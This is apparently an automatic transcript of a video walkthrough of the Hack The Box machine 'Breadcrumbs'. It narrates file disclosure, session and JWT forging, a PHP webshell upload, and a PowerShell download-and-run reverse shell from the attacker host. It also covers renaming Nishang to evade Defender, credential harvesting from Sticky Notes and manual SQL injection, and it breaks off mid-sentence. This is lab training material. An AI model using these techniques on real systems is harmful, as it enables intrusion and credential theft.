 what's going on youtube this is ipsec i'm doing breadcrumbs from hack the box which was a really fun but tough windows machine that started out with a web application that just had a lot of small vulnerabilities that you could use to piece together information to build a final exploit that involved forging a php session id a jwt token to assume a user then you can do a file upload and get shell on the server once on the server you can poke around you find other passwords there is a custom linux application that's like a password manager that you have to do some light reversing on and do sql injection in it so with all that being said let's just jump in because it would just be a mess trying to explain this otherwise as always go over the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it breadcrumbs and then the ip address of 101010 to 28. this can take some time to run so i've already ran it looking at the results we have a lot of information on the screen and more ports than we can actually see on one scroll so let's just go through them the very first thing we have is ssh on port 22 and its version tells us it is open ssh for windows and if we scroll down we can see 135 139 and 445 so chances are this is a windows box as all those ports are common with windows the next thing we have is http on port 80 and its banner tells us it's apache httpd which is a bit unique because most time when windows are running web servers they run iis this is running apache it has the php and open ssl module and its index page is giving us the php session id cookie so chances are this is a windows box running an apache web server that has php a bit different than what you may see often which is a windows box iis running asp so whenever we do go busters we will add the php extension and then 135 139 not too much there 443 so it does have a um ssl and looking at the certificate it's just localhost so it's not exposing the hostname in this ssl cert but there's a chance that apache may give different sites between http and https so we should check that out 445 is just saying open and right off the bat i always like just doing smb client dash capital l and then 10 10 10 228 and we'll just try null authentication and everything to make sure we can't list shares so it doesn't look like we can do anything with smb then we also have my sequel on port 3306 i'm not sure why this oracle tns is there uh it's weird saying oracle right here and then mariadb which is my sequel down here uh here's 10 10 14 8 is not allowed to connect to this mysql server so i'm probably not going to poke too much at that we can see the clock skew um it's not leaking a hearse name or anything like that so that's about it for nmap i'm probably going to begin with poking at the web server because again that's where most of the user input is so let's go to 10 10 10 228 and we can see it's just library i'm going to do https and the same exact thing except i copied it wrong there we go we have a ssl cert i'm going to view the certificate first just to see if there's like alternative names or something that may leak a host name nothing here we can see it was generated november 10 2009 so this is a really old certificate um it's weird because is there a way to leak what windows version we have with this because if this certificate's accurate it was generated before the distribution of windows came out but we can see still the same page so nothing too interesting there let's go take a look at what we can hit we can go to home and we can check books so this goes to a directory slash php and what i want to do is set up a go buster so we have some type of recon going on in the background so go buster dir for directory mode then dash w word list opt sec list um what is it discovery web and then we want to do rap small words and lowercase x for extension php dash u http 101010228 and the reason why i specify lowercase because this is windows so we have this books.php if i put like the o and k capital it still resolves because windows uses the ntfs file system or fat32 both of which are case insensitive so you don't have to worry about casing linux the file system is case sensitive so you always have to worry there's this php directory and if we go to it it looks like we have the index page there so there is no index.php here but it's only showing books.php so nothing interesting there do dash o for alt and we'll just call this um root dot go buster i guess and let's take a look at this so we have two fields uh title and author i'm gonna put please subscribe and author of a i guess and we're gonna do search and we have hits and it looks like every hit that we have has an a and the author's name i'm gonna do an uncommon character and a name in z and we have nothing found so let's do a again we have mark twain i'm just gonna put mark as the author and then let's do a in the title and we can see that um this looks like it's an or because we have or uh mark there and these authors don't have mark anywhere we put z in the author it still pulls the same results because all these titles have an a so we kind of have enumerating how this works it's a probably select title author action uh from whatever table name where title is equal to this or title is equal to probably like percent a percent because we don't have to match the whole thing and percents are wild cards or or author equals something so we know it's an or um the first thing i'm gonna do is put like a single quote and we only get a hit of mark so i'm gonna hit z's real quick nothing found uh let's do a comment after that let's try putting a double quote no quote and just a again so basic thing says this is not sql injectable uh of course we probably need to do more testing or send this to sql map but this is just something i can do in like five seconds to know if i want to poke at it or not so let's try changing the author to mark and the title disease so we have i guess just one book single quote double quote single quote comment double quote comment and nothing we could try if we do a again maybe mark or lewis and try getting um sql statements in there but it doesn't look like we have that either so there's nothing too interesting here we can click on this book and let's see adventure time sawyer if we click no it just goes away if we click yes it says book checkout is currently unavailable so if we open up our debugger with f12 or this is like developer console i'm just going to look at this button see if we can get the source quickly to see what it does and i'm not sure if you can see so i'm making it bigger it says on click alert book checkout currently unavailable so i know this isn't sending any traffic so i'm not even going to bother fuzzing it it's just on click do this javascript static so not interesting to me we can move on so i probably should send these to sql map but first i want to check out my go buster to see exactly what we have uh we have a 301 there lots of 403s so hd passwd so it looks like if the file name begins with a period it does 403 examples is 503 what error is that i don't know that off top my head slash examples service on available okay so i don't know what that's doing books gets redirected portal gets redirected we have a db so i probably want to check out db includes and portal so let's go to db first and we have db.php but nothing is there um the file does have contents and we just can't see it because it's a php file executing code and not outputting it out we could view the source to confirm yes it is indeed empty uh there is a includes and we have bookcontroller.php and footer.php if i click photo.php it goes to the copyright we click book controller nothing looking at this link it's going to a github page and this looks like probably the machine author i don't see anything that says like um some type of library or something so we can't just pull the source code off of github so let's see we looked at includes we looked at db we looked at php so let's check out portal so let's go to slash portal and we get a login it says restricted domain so right off the bat i'm thinking okay well i probably have to do some type of server side request forgery eventually because it's doing some type of acl based upon ip address return home which is just going to this page or going to contact helper which has just names of users so i'm going to copy this let's do v users and if i was not rushing through this i would have done this in obsidian and take better notes but do what i have so this to you and then move you to users there we go so it says we can log in so we can always just try like admin admin uh we could also look at the request so again hit f12 we could send this to burp but sometimes it's just easier to use your built-in tools and i just want to look at what we're sending for this login.php and we have username password and method so i don't see any type of csrf cross site request forgery tokens so we could easily build a brute forcer to brute force away in or spray passwords of a bunch of users when we send this it says username or password is incorrect so if i try logging in with like paul password username or password is incorrect let's do lowercase i'm just saying if there's a way to enumerate usernames on this thing i don't see a forgot password and that is also common when you have forgot password type the username and sometimes it would say oh we sent an email to this or this user doesn't exist so just trying to enumerate usernames right now doesn't look like we can but we can sign up so let's sign up ipsec please subscribe if i could type that correctly it looks like i did sign up and we're in so let's do please subscribe to log in and we can take a look so a role is awaiting approval so at this point server side request 4g from the previous page this page looks like we have to do some type of cross-site scripting to get an admin to approve our account and if we looked at the previous page we don't know who is admin or not so let's see check tasks add library checkout store book fix php sesh id infinite session duration generally when i see this there's some type of issue with how they're generating php sessions and the cookie itself doesn't have a timeout thing so always look at php sessions and looking at this when we log in let's see um what cookies do we have so we can easily go to storage and we can see my phps id is ipsec and then looks like a md5 sum if i grab this echo dash n wc-seed account 32 characters so this is a php session i wonder if burp suite free can do what i want to do probably not so in burp suite there is a thing to log like php sessions so let's see intercept off let's just try logging out to do this ipsec please i should have just did password something easier to type log in let's see can we send to something sequencer that's what it is let's see cookie let's try start live capture and then we can auto analyze it next 100 and it's been so long since i used this field like i almost never use this overall result so it's saying the quality of randomness is extremely poor entropy is expected to be two bits so we have around 700 logins so i'm going to stop it we're going to save tokens and then let's see let's go ipsec htb uh this is breadcrumbs and i'm doing all this piece live i did not do this when i was actually testing the machine so um hopefully it works and we don't get cursed by the demo gods so less login cookies okay so we can sort login cookies and then unique c and we can see how many times we did it so there were what like 700 cookies uh let's do get rid of this wc-l like 716 cookies but only six different sessions so there's some way we can probably brute force sessions right now because in a perfect world there should be 716 logins and 716 unique cookies because the cookie should be random but because there's only three or there's only six or wait one two three four five let's wcr five it's only five that's interesting so there's definitely some issue going on with their cookies hopefully this piece of the video made sense so we can close out of this turn intercept off and go back in so definitely look into php sessions uh we have this these buttons on nuke it if we click ok it just goes oh if we just click it it just goes to awaiting approval so i'm going to um inspect the button to see exactly what happens and on click alert awaiting approval so just like before it's not sending any data it's just immediately sending javascript or executing javascript so we can kind of ignore this this i guess is like a to do.text to look at things let's go back to home order pizza disabled for economical reasons uh again you'll notice i love using this feature to just look at exactly what's going on on click alert disabled so not going to take a look at that button uh this portal does have a slash php so after we go through all these files i'm going to take a look at php to see if we missed anything uh we have looks like more users alex paul age um what they are so nothing too interesting here we know admins or alex and paul and also jack so that's good but nothing to send input clicking file management uh doesn't really do anything so at this point i'm going to go portal php to see if they have directory listing and it looks like they do but we've hit every page because everything is purple so i want to inspect exactly what's going on here and we can click on this file management go over to the network tab let's click this again looks like it does a get on files.php and it's a 302 redirect if we look at the response firefox doesn't really tell us anything but with all three or two redirects you should just double check especially in php that it's doing what you think so i'm just going to wait copy okay i copied url i want to copy as curl because it's going to put my cookie and all those cool things and we can see i want to get rid of that text there we go it's a 302 redirect let's add a v so we can see the headers but it's a three or two redirect however there's content so if we edited this to not b302 we could potentially see something that we shouldn't and this is i wouldn't say somewhat common in php because a lot of frameworks handle it but if you're coding something without a framework it is relatively common because people set the 302 header in the php code and assume the php is going to send that header and stop but if you don't put like um a die or return or whatever return is in php after that it's going to keep on executing code and put the data i think it was like a bank one of the first videos i did we explained this because it was a cool unintended route so let's go and send this over to burp so i have to go proxy intercept on and let's click file management and then we want to let's see do intercept response to this request click ok and we just want to say was it 200 okay i don't think i think it's just 200 right what is a normal http response look like oh man uh let's see change request method no intercept response yes uh 302 found okay let's get this index uh get success 200 okay so it does say actually okay so let's go file management intercept response and then go 200 okay so we just removed the redirect so now when a browser sees this it's going to display the page which is task submission this looks like a file upload form as we have this big old upload button so what i'm going to do is we're going to make dir upload just so we stay a bit organized and i'm going to make test.php and the only thing this is going to do is echo back please subscribe and the reason why i'm just doing an echo first is because this tells me it works if i jump ahead and do like php info it's possible that could be a blacklisted function or system could get picked up by av things like that so whenever i test a file upload form i always try to keep it as simple as possible first and this i'm just doing a simple echo if i just see please subscribe i know it worked if i see echo please subscribe i know it did not so let's go and upload the page so i'm going to do htb breadcrumbs if you're wondering how i did that i just did ctrl l i believe upload test.php and we'll call this test and i do want to intercept this just to see exactly what this request looks like i did ctrl r to send it in repeater we can click forward and see what it says insufficient privileges contact admin or developer to upload code if i recently registered please wait for one of the admins to approve it so i'm going to leave this page here so i have to go play with that 200 redirect and or 302 redirect we can see i'm still awaiting approval so going back to this we can go to this repeater thing it is going to the filecontroller.php and sending it i'm just saying if there's anything that says my username there's not really we have filename and the task so nothing we can really do with this so let's go back to the recon we had going on in the background that go buster to see if there's anything else we have i'm just going to cat the thing which was root.gobuster i'm going to grab v403 and there is let's see we saw all these we didn't see this slash books so let's take a look at what slash books is so let's go slash books and we have book 3 7 8 9 10 11 12 14 and again always have recon going in the background i'm trying to think what i want to do because all these directories are open so this is normally where i try to like do a brute force and look at files inside of each directory but i can already see any or a c in them so maybe if i was really eager i'd start running sql map on the search parameters but i'm not going to do that for this video because i can't really think of much to do we do have book three we have the title the author the maxim borough time and about so this looks super familiar um maybe there wasn't a database at all on a previous page so let's just go all the way back go to checkbooks and remember when we let's just do a and do this search we click book it's displaying the contents of this html file we got title author max borrow time 10 days and about so i think i was wrong and somehow this isn't a database like this is where my mind is like getting blown away like why do these files exist so uh let's instead let's go into proxy intercept intercept one of these request and send this to repeater this is going to be file upload i'm just double clicking up here so we can rename this and this is book i guess i don't know um lfi i'll call it lfi question mark so we can see the parameter it's doing book book three dot html method equals one i don't know what this method is this book looks like it's pulling a file out of this directory so i'm going to do one that doesn't exist so we go to slash books i'll probably have to tell my proxy don't intercept that let's do uh book leap because doesn't exist and we just want to see exactly how this application behaves when you give something that doesn't exist we have file get contents dot dot slash books booklet.html fail to open we're getting the full path of the file oddly enough it's c colon users www dash data um generally when you install apache on windows it would go into like the directory c colon backslash xampp but it's going into an actual www dash data directory and users so this leads me to believe that the service is running as this user instead of a like nt local network account so they actually created a user and has the web server running as it um but it's doing file git contents we know if we give a php file to this it won't execute it it will just um display it if this was like an include then we'd be able to execute php files and i'd be trying things like remote file inclusion things like that but just follow get content so i'm going to try to include let's see dot dot slash index.php and we get it we got a lot of these annoying backslash our backslash ends but we can see it's actually giving us the php code i am going to go back real quick because i want to change this method to see exactly what happens false false uh if method is not 1 it displays false so i don't know exactly what that is but the good news is we can include the file and see exactly how this works so we can do includes book controller dot php and it is ugly so uh we had some sql going on and it's doing parameterized statements with that question mark so no injection but i really want to know what method means that's request method uh let's see method equals zero so if method equals zero it's going to do the sql if method equals one it's going to do the file git contents but let's try to make this a bit prettier because doing this through burp suite isn't gonna be the best because of all this annoyances and when we do this in python we introduce the ability to do some cool things so let's do cool things i'm going to vi and actually make dur lfi we'll just make a quick directory vlfi.pi and the libraries we need of course we're going to need the request so we can make http request uh regular expressions so we can search the page and then cis so we can pull like arg v out so i'm gonna do def all right define lfi page and then the data is going to be equal to whatever this post parameter is we need book and method so book is going to be the page and then method is going to be one and i don't think we put that in quotes so we got data so let's do response is equal to request.post http101010228 includes bookcontroller.php and then data is equal to data so this is going to send the um request and then i'm going to do import pdb pdb dot set trace we can just return here if name is equal to main so all this is going to do is allow me to use the script as a library so if in a different python application i do import lfi it's not going to execute this piece i can just call this function i have up there page is equal to lfi sys.org v1 and then we can print page so python 3 lfi uh index out of range because we have to give it a page so let's just do index.php and it didn't hit this oh set trace like that there we go index okay so if i do response we have that response.txt we have this gibberish so we can do type response.text and we see it's a string and this was really tough to figure out a way to get this to be pretty and this bit of code is going to come from oxdf because i reviewed kind of how he did it and i really liked it so he converts this string over to a binary data and we're going to convert it to utf-8 so all this is going to do now we have the type as b so if i do type like this you can see it's bytes then he decodes it and he convert it to bytes because the string doesn't have the decode feature and then when he decodes it he says unicode escape and if we printed this it now processes all those line breaks and we have pretty code the last thing we want to do well second last we want to get rid of this double quote so let's do dot strip and remove the double quote and then the other annoyance i have is all the slashes are escaped so i'm going to dot replace and we're going to say any backslash forward slash is going to just replace with forward slash and now everything looks fine so let's copy this bit of code so this whole bytes thing copy vlfi and we can say data is equal to that and then return data so now when i call this we have a page if i return something that doesn't exist let's see what happens uh we get some weird unicode error so the only thing i'm gonna do is try and remove that return bytes like that and then accept return response response.text so we're going to try to pretty up the data and if we can't pretty up the data or just return what we had now if i do this it looks perfectly fine and i do this index.php we're good the other thing i like doing is i like coding some type of crawl feature i think if you go to like ipsec.box you'll see me do this probably more in depth somewhere uh forward slash so we're doing we did something very similar to this in this video but i'm just going to code a lazy piece so we'll in this main function we're going to say um let's see page is equal to this so we can do if the length of cis.rgv is equal to three then we will um pull all the links on the page and just print the links else we will print the data and it's three because um even we just give it one argument the length of sys.rgv is going to be two because zero is the file so that's why we're doing three and we can say link sig serg v well like that and then here we can do files is equal to regular expression find all define it as lowercase a to z uppercase a to z zero through nine uh some special characters so i did a hyphen a period and a slash and then we end that we say star so match anything that has this character unlimited length and then ends endsn.php there we go and then the variable is page and then four phi r for f in files print f and i think that's good so now let's do index so sis arc v was a length of two and because i'm lazy i'm making this arc via length of three and we have error messages let's see oh i didn't terminate this square bracket so it's terminated there there we go and now well we got some weird deprecation warning i don't know what that is but we have links of the page so it tells us other files we may want to go grab so we could try grabbing php books.php and we can see that links to different files but this is just to guide us where we want so we have lfi uh if we go back over to our go buster less uh was it we gotta go up a directory last route go buster we can look at all the directories there is this db directory and the db directory generally contains the mysql password which is credentials so that's something we'd definitely want to get our hands on so i think it was just db.php so double check it is so we can go python lfi dot slash db slash db.php and boom creds so v creds i like doing like a note how we got it so this is a my sequel cred the user's bread and the password is going to be julie 901 save so we have some type of credential i'm not going to try logging into my sql because if you remember from the nmap it was saying 10 10 14 8 is not allowed to log into this host so no need to bother logging in if we log out of our application we can try well before we log out let's go to users we can go back to our notes or we could easily just go to slash portal and user management is there a julie user julia so i'm going to try logging as juliet um if i wasn't doing a video and i wasn't concerned about the time i'd build some type of um thing to try logging in with everyone but i don't feel like doing that and just spending all the time there i do it on plenty of other videos so is there no log out function what uh slash portal uh let's okay uh we can go to storage and delete all okay so juliet and the password incorrect so doesn't really help us there we could try ssh juliet at 10 10 10 2 2 3. and wait uh 228 i think is the ip and let's see oh we have to disable some type of host key so windows is really weird when you do this ssh login because it's attempting a bunch of public key logins so you can see i'm offering the public key here different public key different public key different public key different public key and then windows 8 you've attempted to log in too much and i'm going to deny you so the way around that is to either do a o option and disable public key login uh let's go to google and ssh option disable key let's see maybe disable pub key there's a dash o i want i can just do pub key authentication now ssh options are weird pub key authentication equals no can i do that yeah so that's how you can do it and we try logging in and i had the bad thing so cat creds we can try logging in with this password but doesn't really buy us anything so we have creds but who knows what those are good for so let's go back to this file upload piece so i'm gonna go to portal php files.php actually is that it file upload actually portal includes filecontroller.php and see how this works so lfi paste this and boom we got the code i'm going to output this to let's do maker source file controller.php wait what oh god source like that vim source file controller so now we have syntax highlighting uh i wonder if i can just do dos to unix real quick to fix that that was unexpected dosto unix write the file uh won't do that again vam source or just ignore those m's so it's using a um i think that's code igniter or i don't know exactly what it is i see that on a lot of coding native code but using some jwt library we have this vendor auto load session start it's doing validating so we're taking the jwt is equal to cookie token and we got a secret key jwt decode so if i go back into this we don't have a session token anymore i think i wipe that out so let's uh log out actually let's erase everything and let's go to slash portal log in with ipsec please subscribe and let's see we got this token which is a jwt so echo dash n let's see this is just going to be the algorithm this is the data and then this is signature so echo dash n base64-d we can see it's data username ipsec so we can change our username here so let's go to jwt.il let's turn burp suite off so we can go to this page we can paste this and if we put a signature here which was in the code so let's do that vim again uh i'm going to less this so we can easily copy paste we can see signature verified so now we can change the username to be anything we want if we keep going through the code we have username should equal paul so change that and for this file upload piece to work we need to be both in this jwt which is right here and our session has to be paul right now our session is ipsec uh if you remember a few minutes ago probably 10 to 15 probably 15 to 20 minutes ago we talked about like the insecure php session so we should look at where that session is generated because we gotta get paul session id so let's see where is session so we got session start there but nothing let's go user lfi script instead of portal includes file controller is there like a login dot php where do we log in at let's go back to burp suite proxy history that's jwt portal login.php let's look at that uh we can do a just so we can see something we could go through this code or i'm guessing auth controller is something that's good to check so i think that's just at portal auth controller and let's see what we have that's the select method valid so this is doing make session so this is doing a generating the jwt as well um i guess they define the secret key in multiple locations instead of a central config file which isn't good practice but we have to find out where the um login is so make session we have to figure out where it is and i don't see make session in this file nope so it's in one of these we looked at db already could be in this vendor autoload i'm guessing it's probably cookie.php so let's go portal cookie.php and here we go we have function make session username oddly enough it says don't use php id because the security team says it's predictable but i mean this was predictable as well as brips we told us change second part so they're changing this every week but it's not a good fix because the login sessions were indefinite if you remember from on the page it was a action item so let's just go how this works max is going to be the length of username minus one so ipsec our username was six characters and we had a total of five unique tokens so ipsec is six characters minus one that's five so something's based upon the username already so let's look at this rand 0 to max key is going to be salty string then the username seed so it's pulling a random character out of the username and then adding this and then username.md5 key so this should be super easy to create in python i'm going to copy this fim uh we may not even have to go to python let's see i'm gonna go ballsy and try doing this v php and php on the fly so user.php we have this function if i do make session ipsec does this actually work echo this php user let's gen wrap this in php tags sweet we can generate cookies awesome so let's see session seed and then seed is going to be 0 to 5. so we could do a loop but because my php knowledge on the fly is horrible i'm just hard coding it for and then we need five so we do this awesome we just need echo line break is that going to do it it is so we didn't even have to write python code oh is it if we do backslash our backslash n uh maybe we need double quotes there we go so may have been faster to do this in python now but that was cool so now we have all its sessions so we can do this with paul so percent s ipsec paul bam and run it and we have a few issues oh paul is less character than ipsec so we can probably delete that because paul is going to be four characters you minus one so that is fine and we have a few tokens so let's go over here and we can uh let's make sure this is going to burp suite go over here refresh this and let's go to slash portal send this over to repeater and we can replace all the tokens so that's a 302 found directing at login.php so let's try the second one replace go login.php not logged in we're just looking for one that is not a 302 or at least a 302.login.php it did not paste and there we go we have a valid session for paul so if i go into here we change my token to be paul we go to slash portal uh we have to turn intercept off we are now paul the admin so we go to file management and we have to also edit our cookie we're not a cookie well yes the cookie but our token is saying we are ipsec still i think so if i do this echo dash n base64 dash d yeah our data username is ipsec but remember we already did this we have the secret down here so we can just copy this go back into firefox uh let's see f12 storage token change this to b paul so now our php session is paul and our token is paul refresh page still works i'm going to [Music] do our test.php and let's send this over to burp suite clear the cache upload and let's see the task it is appending test.zip so i'm going to change that to be test.php because we didn't upload a zip file name like that echo please subscribe looks good send this over and we have a fatal error uh let's see looks like it's with our token signature verification failed vendor jwt.php yeah so something did not like our token let's see username paul that's weird uh do this lfi again that was in cookie i think no well maybe it wasn't cookie no it was i think like file controller or something let's see history grep lfi.pie let's see auth controller here we go this one oh i even put it in the source directory them source file controller so that's the secret key let's grab this and go back to jwt io paste it i don't think anything changed let's go back to [Music] burp suite we can just edit this token paste something change there okay something did change so i guess we copy and pasted it wrong um let's just edit our token here so we're all set so success have a great weekend so where does this rate it to uh uploads directory name uh uploads directory let's see where this is i don't know is that in oh dot dot slash uploads there it is so let's go portal uploads we have to turn burp suite off and we got test.php and it just says please subscribe so we know we have a um rochelle there we're not reverse shell we have code execution so here we can just do system and then request um ipsec i guess like that send oh failed fail to open stream let's do echo please subscribe to my channel success bad php code because i didn't terminate this quote but success so something doesn't like system pasta arg let's try shell exec and then request ipsec success and we can say ipsec equals who am i uh we probably have to print this so echo and there we go um chances are that was windows defender deleting a payload because it uploads the file then it moves it and when we just did system a command uh when it went to move the file it errored so i guess that was some like av or something putting out bad characters and we changed the pilot slightly instead of system we say shell exec and all works so we have a shout out to this box uh we probably want to get a like normal reverse shell because doing everything through a browser is going to be a pain so let's try that i'm going to send ipsec equals let's do powershell iex new object net.web client uh it's been so long so i typed this dot download string http 1010 14.8 shell me dot ps1 let's see if that works pseudo nc lvnp 80. i copied that and we get a request show me dot ps1 so that is good so make dur dub dub dub and what we want to do is put the shang here so cp user share i think lorna uh let's see the shang there we go nashang shells and then invoke powershell tcp.ps1 we'll move it here and we'll call this shellme.ps1 and let's see invoke so we can get rid of all these comments and we probably just want to do the reverse so i always put this at the bottom but let's keep deleting comments there we go and the reverse ip is going to be 10 10 14 8. and the port is going to be 9001 so we can go back here i'm going to run script and we'll say shell.log and then rl wrap nc lvmp9001 and all this did is going to log every command input output here so we have some type of logging of a reverse shell activity python3 dash m http server 80. so now when i request this we got it but we didn't get a shell so either or a script is bad or defender blocked it um we can try some quick fixes at defender so i'm going to do percent s invoke dash power shell tcp to please sub so we changed all that run this again we got it and we have a shell so all defender was looking at was that invoke uh dash like reverse shell tcp line so renaming the function was enough to bypass defender awesome so we have a shell as dub dub dub and the first thing i want to do is just poke around at the web application to see if there's anything we missed uh we have this pizza delivery user data so let's just check this out because we did not find that directory we do dir and we have a bunch of files uh the length 170 so i'm guessing all these at a 170 is the same if we can take a look at it let's just do type and it looks like just some json data everything's all out and the dates are the same but one is different juliet's and it's at 3 11 p.m so let's do type and take a look at hers and we have potentially her credentials and this looks very similar to the sequel cat creds yeah so json juliette and then that so what i'm going to do is try that ssh again pubcu awesome it was in my history so j-u-l-l-i-e-t-t-e good paste let's make sure we have the password correct copy paste oh there's only one l man that would have sucked if the other password is set and we wasted all this time but so much good information has happened and we have ssh as drool yet the other thing i probably should check i didn't check it because i was in this user's directory but do a who am i slash priv to see if we have sem personate because we did exploit a service and services generally do have that privilege but this one does not and if it did that just meant we could do rogue potato or sweet potato which is the new version of juicy potatoes so many potatoes to keep track of but that would be an instant private we could also potentially look for like print nightmare which may be vulnerable on this box however we already did a video on that and that came out way after this box was released so not gonna go digging into that but if you want to look at it go to ipsec.rocks type print nightmare and you'll see me explain that vulnerability so let's go over to our ssh session as juliet we do dir if we go into desktop we can now get user.txt and there's a 2do.html so let's take a look at this uh configure firewall for port 22 and 445. it's not started well i guess that's done because we could ssh on 22. migrate passwords from microsoft sticky notes application to our new password manager add new features not started so we got some type of um thing going on here microsoft sticky notes application so i'm going to let's just go into like app data see if we can find it if i can't find it then i'm going to run like win peas or seat belt and see if we can get data but i'm going into app data to see if i can find microsoft sticky notes adobe that's flash so not there local let's see microsoft clr games play ready vault windows could be in the vault local load nothing there what else was in here see let's just look at program data real quick windows holographic drivers that sounds so cool but it's probably a letdown i don't see where sticky notes is so let's just google location so app data microsoft sticky notes cd app data it's in roaming but there's no microsoft what gc that slash h what's hidden uh let's see slash a with specified dare slash a h uh let's see now i'm curious i know i did this in a video before uh let's see powershell show d-i-r hidden there we go how do i show hidden files because i'm surprised that microsoft directory existed say powershell adh see windows powershell dir-force i'm not sure but okay we go in there microsoft windows and then is there sticky notes so app data microsoft sticky notes sticky notes so i don't see a sticky notes directory so let's go back over to google and instead of say application location or application location yeah i'm gonna say backup microsoft sticky notes let me get this article let's see do they have a different directory uh app data local packages what is this so let's go here go back here app data local packages does that exist looks like it does and let's see is anything in app data ac uh is it saying where things are it isn't really ac temp let's see gci dash recurse get child items oh i'm not in powershell that's why gci wasn't working there we go there we go that's better uh let's see we got a sql light database local state so i'm going to try grabbing this file and we have ssh on this box so it should be super easy we can exit out of that script is done there so if i looked at my um script shell.log you can see i logged all the commands i ran there but we want scp so scp scp-j-u-l-i-e-t-t-e at 10 10 10 238 i think the path plum dot sqlite copy it here and we're probably going to have to say dash o for pub key authentication pub key authentication equals no because windows is weird with ssh oh that did not work uh ipconfig 228 i have 238. what if i made that like verbal misspelling a few times before not sure file name does not match the request let's see let's get rid of this c colon this is going to be the pain let's get rid of quotes because i don't see any spaces here did it download uh you don't see it uh we probably should replace all these slashes with or backslashes with regular slashes there we go we have downloaded plum dot sql lite so i'm going to do dump and we can see it's empty uh let's just copy that whole directory so make dur copy just go in here because we're going to do lots and lots of files there we go so i guess the files were in different things so we can look at this i'm going to do i think it's schemata dot show tables dot show my sqlite foo is failing me let's see insert into values so we have juliet joule so let's do select stir from note probably okay so we have a few things we have juliet and juliet's password and then development and potentially developments password i'm going to do net user that's going to list all the users on this box and development is a user so let's go and v creds and add development so this is sticky development there we go sh let's see oh no okay so sh-o pub key authentication equals no development at 10 10 10 to 38. or 228 i don't know why i keep thinking 238 but paste this in and now we are the development user if we go into desktop nothing is here uh let's do powershell oh if i do gci recurse there's probably lots gci recurse nothing all these directories are empty so this development user is there for something but it's not in the home directory net user development we can see what groups i'm in my username is development country password last set last login is now it's just a member of users so there's nothing special about this account but there is a development directory that is off the root and it looks like there is a is that a directory a file crypter linux that is a file so we want to download this file so go back to our scp we'll say development and then we gotta specify that file so backslash develop mint crypter underscore linux and the password is this so now we have downloaded that let's make dirt dot slash reverse and cp crypto linux into reverse chmod plus x so this is a looks like a 64-bit file so i'm going to run guidra and we'll see if we can figure out what this thing is doing so close open this come on uh ctrl o to open no let's do it's probably i import file ipsec just making sure there's nothing special in that directory no that's fine the downside with doing videos sometimes like oh man am i like disclosing things i shouldn't but no that's fine uh up one directory hdb uh breadcrumbs reverse crypto linux okay analyze it select all short okay and let's take a look at this so i'm just going through finding main and let's see exactly what it does so crypto it's a new project by juliet new features added weekly what to expect next windows version with gui support get past from the cloud automatically decrypt them so we can kind of see what's going on method equals select username because administrator table equals passwords so i wonder if what happens if i just execute this no key supplied test incorrect master key so let's see no key supplied see what is this doing so we failed this if then and i'm not a hundred percent positive what it's doing but if we look at this we can probably just um ignore this and write this ourselves because it's just doing a curl to pass manager.htb colon1234 4 index.php with some parameters meth equal select username administrator table equals passwords so we can just skip using this program and do it ourselves with curl the main thing is we have to get to this box on one two three four if i do nc zv 10 10 10 2 28 1 2 3 4 connections refused however we could just run like chisel on this box and send a support or we can um abuse ssh and just use an ssh tunnel so ssh dash l for local tunnel one two three four localhost one two three four juliet at 10 10 10 2 2 8 we could use development too there's no reason why we're using juliet um yeah so specify this and we'll see if port forwarding is allowed uh we have to do that dash o pub key authentication equals no paste the password and now if i do nc localhost1234 uh we are connected so let's do sudo vi etsy hosts i was like pausing i'm like is there anything in this host file that's sensitive was i working on a box or anything but no this is empty let's do pass manager.htb curl pass manager.htb and we get a page i'm just gonna see what this looks like in a browser wait what oh it's i guess been a long video this is actually 127.001 uh port one two three four empty reply from server so let's try index.php and get empty reply from server do dash v to see what happens it connects and doesn't do anything so let's go and send it the parameters at once so i think we just do probably dash d and then copy this so dash d maybe try my other clipboard and still empty reply from server so something is not working i'm guessing because i would think we'd get something see pass manager.htb colon 1234 index.php i'm like looking to see if we set any other options like a user agent but i don't see anything else let's see we can go back to here and we can curl this does this get the same thing let's try localhost i guess the curl on windows is different than linux i wonder if we just curl index.php http i'm just saying if it gives us data or it's just a blank response the internet explorer engine's not whoa that is weird so let's see what do we have wrong here everything looks fine on our curl so let's try executing the program and we have for that we have to um figure out that um master key thing so looking at this if local 1c is equal to 641 i'm guessing this is just like an integer so local 1c it's going well true sequel to 0 here uh it looks like i don't know what this sext 48 is or this but it's saying if s bar one is less than or equal to u var2 then break so i'm guessing this is looping through each character and then adding the um byte of it so a is going to be i think it's 41 yeah a so it's hex 41 or decimal 65 so two a's would be 130 in decimal because it's just adding the two so let's test this out this is going to be really bad crypto if it is but 0x641 so let's go to google.com 0x641 to decimal is 1601 so we just have to have that parameter equal 1601 when it's all added so let's go back to our ascii table real quick and let's find a nice equal thing so 100. so if we did 16 ds theoretically it would be equal to 1600 then we have to insert a start of header 1. we can't really put that as that so let's do 15 ds so we're going to be at 1500 and we need to get to 1601. so if we add a 50 and 51 after the 15 ds i think we'll be there so 50 is 2 and 51 is 3. so one two three four five let's just copy that and paste it three times there we go i pasted twice so now we have 15 d's and keep in mind each d is a hundred so if you added the value of d from left to right we're at fifteen hundred and then two is fifty three is fifty one so this should equal 1601 which is uh 0x641 so let's do dot slash crypter this and we pass the master key and we still get a blank server response so we did everything correct and that errors out let's go back to our tunnel and if you look at this we did specify localhost so maybe localhost does ping localhost so it exists but it's going to ipv6 if we do netstat a n let's see one two three four it's listening on 127.001 not the ipv6 so let's try changing this to be 127.001 and then if i cat creds or it's in this juliet his password is this oh i already had that down there oh well so we have that and there we go we got a server response so that works awesome so let's try our curl again so i'm going over here and we're going to grab a curl let's just go to this pane to keep it clean and then i'm just going to log this because i'm going to be doing a lot of things and if i was on an engagement i may want to pull previous like things i ran to get an idea of what i did so instead of taking screenshots as i go this is a good way so let's do sql test.log and then i'm going to paste this and running this command which is the same command the actual application runs because we pulled it from here we get this so we can try testing out sql injection and i always like doing single quotes first because that's most common in sql for whatever reason so i'm going to change this d to be double quotes so i can just put a single quote in here and we do have an error message mysql fetch all so let's try putting a comment afterwards and it works so we know we have some type of sql injection here we could try like building a quick web app and passing this to sql map and letting it automate it or we can just do the fun thing and do it by hand so doing it by hand we're gonna try union select one and we have to again end it and a comment and we see we selected one so if we put please subscribe here please subscribe we can put anything here so we want to dump database information so we're going to try to select stuff out of information schema so for this let's go google.com information schema go to the reference and let's see table reference the first one i like doing is the schemata and we want to get all the potential schema names so we can do select schema name from information schema dot schemata and we have two databases information schema which is the default one and then bread which is the database we want so we can go back into 